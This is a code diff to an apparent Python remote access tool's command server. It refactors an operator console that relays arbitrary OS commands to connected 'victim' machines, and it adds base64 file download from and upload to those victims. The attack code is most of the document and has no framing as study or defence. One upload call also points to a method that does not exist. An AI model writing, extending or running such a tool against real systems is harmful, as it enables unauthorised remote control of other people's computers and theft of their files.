@@ -5,8 +5,15 @@ import sys
 import subprocess
 import time
 import os
+import base64
+
 
 class InteractVictim():
+
+    def __init__(self, victim_id:int, victim_connection:socket.socket):
+
+        self.id = victim_id
+        self.conn = victim_connection
 
     def _victim_help(self):
         """Displays available command that can be run on a victim."""
@@ -14,7 +21,9 @@ class InteractVictim():
         victim_cmd = {
             "help\t": "Print this help menu.",
             "back\t": "Return to the console(background to current connection).",
-            "    \t": "All default commands of the system."
+            "download": "Download a file.",
+            "upload": "Upload a file to server.",
+            "    \t": "All default commands of the OS."
         }
 
         print("[+] Help menu.\n")
@@ -23,21 +32,42 @@ class InteractVictim():
         for cmd in victim_cmd:
             print(f"{cmd}\t{victim_cmd.get(cmd)}")
 
-    def _send(self, conn:socket.socket, data:str):
+    def _send(self, data:str):
         """Sends data as json to conn."""
 
-        conn.sendall(json.dumps(data).encode())
+        self.conn.sendall(json.dumps(data).encode())
 
-    def _upload(self):
-        pass
+    def _does_file_exists(self, file:str) -> bool:
+        """Check if a file exists or not. Return True or False."""
 
-    def _receive(self, conn:socket.socket):
+        return os.path.exists(os.path.expanduser(file))
+
+    def _write_file(self, name, data):
+        """Download file from the victim."""
+
+        try:
+            with open(name, "wb") as file:
+                file.write(base64.b64decode(data))
+        
+        except FileExistsError:
+            print(f"[!] File named {name} exists.")
+
+    def _send_file(self, file):
+        """Send file to the server"""
+        
+        with open(file, "rb") as f:
+
+            self._send(base64.b64encode(f.read()).decode())
+
+        return
+
+    def _receive(self):
         """Return data received from the conn."""
         json_data = ""
 
         while True:
             try:
-                chunk = conn.recv(1024)
+                chunk = self.conn.recv(1024)
 
                 if not chunk:
                     return None
@@ -51,23 +81,40 @@ class InteractVictim():
                 # Socket was closed/reset.
                 return None
 
-    def victim_console(self, victim_id:int, victim_conn:socket.socket) -> None:
+    def victim_console(self) -> None:
     
-        while victim_conn:
+        while self.conn:
         
-            data = input(f"{victim_id}-> ").strip(' ')
+            command = input(f"{self.id}-> ").strip(' ')
     
-            if data in ["help", "back"]:
+            if command in ["help", "back", ]:
 
-                if "help" == data:
+                if "help" == command:
                     self._victim_help()
                 else:
                     break
-    
+
+            elif "download" == command[:8]:
+
+                self._send(command)
+
+                file_name = command[9:]
+                file_data = self._receive()
+
+                self._write_file(file_name, file_data)
+
+            elif "upload" == command[:6]:
+                self._send(command)
+
+                file = os.path.abspath(command[6:].strip(' '))
+
+                if self._does_file_exists(file):
+                    self._upload_file(file=file)
+
             else:
-                self._send(victim_conn, data)
+                self._send(command)
         
-                receive_data = self._receive(victim_conn)
+                receive_data = self._receive()
             
                 if not receive_data:
                     continue
@@ -79,8 +126,6 @@ class InteractVictim():
 class Server():
 
     def __init__(self, ip:str, port:int):
-
-        self.victim_console = InteractVictim()
         self.ip = ip
         self.port = port
         self.is_server_on = False
@@ -218,7 +263,8 @@ class Server():
                         print(f"[-] Victim with ID {id} does not exists.\n")
                         return
                     
-                    self.victim_console.victim_console(id, self.victims_dict.get(id))
+                    victim_console = InteractVictim(id, self.victims_dict.get(id))
+                    victim_console.victim_console()
     
                 else:
                     print("[-] Please enter a valid command\n")
